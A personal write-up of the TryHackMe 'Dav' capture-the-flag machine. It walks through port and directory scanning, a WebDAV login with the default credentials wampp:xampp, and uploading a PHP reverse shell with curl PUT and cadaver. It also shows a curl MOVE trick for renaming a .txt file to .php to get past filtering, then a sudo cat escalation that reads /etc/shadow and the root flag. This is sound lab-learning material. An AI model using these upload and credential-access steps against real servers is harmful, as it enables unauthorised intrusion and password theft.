---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Dav
# DESCRIPTION       . boot2root machine for FIT and bsides guatemala CTF
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/bsidesgtdav
```

```bash
sudo nmap -sSVC -T5 -p- 10.10.250.114 -oN Dav
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

```
ffuf -u http://10.10.250.114/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

```
webdav                  [Status: 401, Size: 460, Words: 42, Lines: 15]
```

- The page is asking for credentials ; I've tried using Hydra for a while with Seclist's usernames.txt and rockyou.txt but I had no luck.

- In the meanwhile I had searched about `webdav` since I had no idea what it was. According to some forums, `wampp:xampp` or `jigsaw:jigsaw` might be valid default credentials.

- I was lucky with the first pair and I found `passwd.dav` file.

```
wampp:$apr1${REDACTED}
```

- During my initial documentation, I found out that webdav can allow us to upload files to the webserver, so I wanted to try this first, as I don't have a clue about what to do with the credentials just yet.

- The manual way of uploading a reverse shell is using `curl` as follows

```
curl --user "user:password" -T 'shell.php' 'http://IP/webdav/'
```

- In case there would've been any filtering going on, we could've uploaded the shell as a `.txt` and rename it to `.php` with the following syntax

```
curl --user "user:password" -X MOVE --header 'Destination:http://IP/shell.php' 'http://IP/shell.txt'
```

- The same can be achieved using `cadaver` tool.

```
Authentication required for webdav on server `10.10.250.114':
Username: wampp
Password: 
dav:/webdav/> put shell.php shell.php
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 3461 bytes succeeded.
```

- The user flag is located in `/home/merlin/user.txt`.

- The user `wampp` exists on the system and the hash from the file we found earlier, according to hashcat's documenation, encrypted with `Apache $apr1$ MD5, md5apr1, MD5 (APR) 2`. 

- However, using both `hashcat` and `john` against this hash with `rockyou.txt` exausted the dictionary so I assumed this is not the intended way.

- I then started to look for privilege escalation paths from `www-data` and I've noticed that we are able to run `cat` as sudo. 

- I tried copying the user's passwords from `/etc/shadow` and `/etc/passwd` and unshadow them and then crack using john, but, again, it was taking too long and my laptop became an airplane, so there was no point for me trying harder, as this probably was not an intended path.

- I guess I must satisfy myself just with a `sudo cat /root/root.txt` to get the last flag.

___

**NOTE**:

- I spent some more time on the system after getting both flags and I've found the config for webdav

```
 cat /etc/apache2/sites-enabled/webdav.conf
```

```
AuthUserFile /var/www/html/webdav/passwd.dav
```

- Which is ... exactly. `passwd.dav`. The same file we found on the webserver after logging in.

- But this is not the same password as the one in `/etc/shadow` (at least judging by the hash).

- Nothing interesting, but at least I figured out that that hash is just the encryption of `xampp`.
